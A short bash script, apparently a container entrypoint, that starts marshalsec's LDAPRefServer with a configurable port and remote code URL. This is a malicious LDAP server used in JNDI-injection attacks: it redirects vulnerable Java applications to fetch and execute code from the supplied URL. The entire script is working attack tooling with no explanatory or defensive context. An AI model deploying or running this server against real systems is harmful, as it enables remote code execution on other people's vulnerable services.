#!/bin/bash

APPLICATION_PORT="${SERVER_PORT}"
APPLICATION_REMOTE_URL="${CODE_URL}"
JAR_FILE="app.jar"

echo "LDAP Server Port is ${APPLICATION_PORT}"
echo "Redirect URL for Remote Code is ${APPLICATION_REMOTE_URL}"

java -cp $JAR_FILE marshalsec.jndi.LDAPRefServer ${CODE_URL} ${SERVER_PORT}

